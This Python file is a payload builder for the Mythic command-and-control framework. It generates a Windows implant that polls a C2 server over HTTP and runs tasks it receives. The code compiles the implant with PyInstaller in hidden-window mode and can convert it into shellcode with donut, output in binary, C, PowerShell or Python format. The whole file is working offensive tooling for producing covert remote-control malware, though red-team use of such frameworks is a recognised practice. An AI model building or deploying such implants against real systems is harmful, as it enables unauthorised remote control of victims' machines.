import json
import os
import pathlib
import shutil
import subprocess
import tempfile
from typing import Any, Dict, Optional

from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class MyAgent(PayloadType):
    name = "my_agent"
    file_extension = "exe"
    author = "@yourname"
    supported_os = [SupportedOS.Windows]
    wrapper = False
    wrapped_payloads = []
    note = "Python 3.11 implant that checks in over HTTP and executes tasks from Mythic."
    supports_dynamic_loading = False
    c2_profiles = ["http"]
    mythic_encrypts = False
    translation_container = None
    build_parameters = [
        BuildParameter(
            name="output_type",
            description="Select the final payload format.",
            parameter_type="String",
            choices=["EXE", "Shellcode"],
            required=True,
            default_value="Shellcode",
        ),
        BuildParameter(
            name="shellcode_format",
            description="Shellcode output format.",
            parameter_type="String",
            choices=["binary", "c", "powershell", "python"],
            required=True,
            default_value="binary",
        ),
        BuildParameter(
            name="callback_interval",
            description="Delay between get_tasking polls in seconds.",
            parameter_type="String",
            required=True,
            default_value="30",
        ),
        BuildParameter(
            name="server_url",
            description="Base URL of the Mythic HTTP C2 endpoint.",
            parameter_type="String",
            required=True,
            default_value="https://127.0.0.1:8080",
        ),
    ]

    def _resolve_build_parameter(self, build_data: Any, name: str, default: Any = None) -> Any:
        if hasattr(build_data, name):
            return getattr(build_data, name)
        if isinstance(build_data, dict):
            return build_data.get(name, default)
        for attr in ("parameters", "build_parameters", "config"):
            if hasattr(build_data, attr):
                value = getattr(build_data, attr)
                if isinstance(value, dict):
                    if name in value:
                        return value.get(name, default)
                elif isinstance(value, (list, tuple)):
                    for item in value:
                        if hasattr(item, "name") and item.name == name:
                            return getattr(item, "value", item.default_value if hasattr(item, "default_value") else default)
                        if isinstance(item, dict) and item.get("name") == name:
                            return item.get("value", item.get("default_value", default))
        return default

    async def build(self, build_data) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)
        print("[my_agent] Starting payload build...")

        try:
            uuid_value = getattr(build_data, "uuid", None) or self.uuid
            if not uuid_value:
                raise ValueError("No UUID assigned to this payload.")

            output_type = str(self._resolve_build_parameter(build_data, "output_type", "Shellcode")).strip().upper()
            shellcode_format = str(self._resolve_build_parameter(build_data, "shellcode_format", "binary")).strip().lower()
            callback_interval = self._resolve_build_parameter(build_data, "callback_interval", "30")
            server_url = str(self._resolve_build_parameter(build_data, "server_url", "http://127.0.0.1:8080")).strip()

            if not server_url:
                raise ValueError("server_url is required")
            try:
                callback_interval = int(callback_interval)
            except Exception:
                callback_interval = 30
            if callback_interval < 5:
                callback_interval = 5

            print(f"[my_agent] Payload UUID: {uuid_value}")
            print(f"[my_agent] Output type: {output_type}")
            print(f"[my_agent] Shellcode format: {shellcode_format}")
            print(f"[my_agent] Callback interval: {callback_interval}")
            print(f"[my_agent] Server URL: {server_url}")

            root_dir = pathlib.Path(__file__).resolve().parent.parent
            template_path = root_dir / "agent_code" / "agent_template.py"
            if not template_path.exists():
                raise FileNotFoundError(f"Template file not found: {template_path}")

            source = template_path.read_text(encoding="utf-8")
            source = source.replace("{{UUID}}", str(uuid_value))
            source = source.replace("{{URL}}", server_url)
            source = source.replace("{{INTERVAL}}", str(callback_interval))

            temp_dir = pathlib.Path(tempfile.mkdtemp(prefix="my_agent_"))
            temp_agent_path = temp_dir / "temp_agent.py"
            temp_agent_path.write_text(source, encoding="utf-8")
            print(f"[my_agent] Wrote temp script to {temp_agent_path}")

            dist_dir = temp_dir / "dist"
            dist_dir.mkdir(exist_ok=True)

            pyinstaller_cmd = [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--name",
                "agent",
                str(temp_agent_path),
            ]
            print(f"[my_agent] Running: {' '.join(pyinstaller_cmd)}")
            proc = subprocess.run(pyinstaller_cmd, cwd=str(temp_dir), capture_output=True, text=True)
            print(f"[my_agent] pyinstaller rc={proc.returncode}")
            if proc.stdout:
                print(proc.stdout)
            if proc.stderr:
                print(proc.stderr)
            if proc.returncode != 0:
                raise RuntimeError(proc.stderr or proc.stdout or "PyInstaller failed")

            exe_path = temp_dir / "dist" / "agent.exe"
            if not exe_path.exists():
                alt_path = list((temp_dir / "dist").glob("**/agent.exe"))
                if alt_path:
                    exe_path = alt_path[0]
                else:
                    raise FileNotFoundError(f"Expected built EXE was not created: {exe_path}")

            if output_type == "EXE":
                payload_bytes = exe_path.read_bytes()
                resp.payload = payload_bytes
                resp.build_message = "Successfully built EXE payload."
                print("[my_agent] Build complete: EXE payload generated.")
                return resp

            if output_type == "SHELLCODE":
                print("[my_agent] Generating shellcode with donut...")
                try:
                    import donut
                except ImportError as exc:
                    try:
                        import donut_shellcode as donut
                    except ImportError:
                        raise RuntimeError("donut-shellcode is not installed in the builder image") from exc

                try:
                    if hasattr(donut, "create"):
                        result = donut.create(file=str(exe_path), format=shellcode_format)
                    elif hasattr(donut, "generate"):
                        result = donut.generate(str(exe_path), format=shellcode_format)
                    else:
                        raise RuntimeError("donut package does not expose a create/generate API.")
                except TypeError:
                    # Some versions of donut expect a positional file parameter only
                    if hasattr(donut, "create"):
                        result = donut.create(str(exe_path), shellcode_format)
                    elif hasattr(donut, "generate"):
                        result = donut.generate(str(exe_path), shellcode_format)
                    else:
                        raise

                if isinstance(result, (bytes, bytearray)):
                    payload_bytes = bytes(result)
                elif isinstance(result, str):
                    payload_bytes = result.encode("utf-8")
                else:
                    payload_bytes = json.dumps(result).encode("utf-8")

                resp.payload = payload_bytes
                resp.build_message = f"Successfully built Shellcode payload in {shellcode_format} format."
                print("[my_agent] Build complete: Shellcode payload generated.")
                return resp

            raise ValueError(f"Unsupported output_type: {output_type}")

        except Exception as exc:
            error_text = f"[my_agent] Build failed: {exc}"
            print(error_text)
            resp.status = BuildStatus.Error
            resp.build_stderr = str(exc)
            if hasattr(resp, "error"):
                resp.error = str(exc)
            return resp
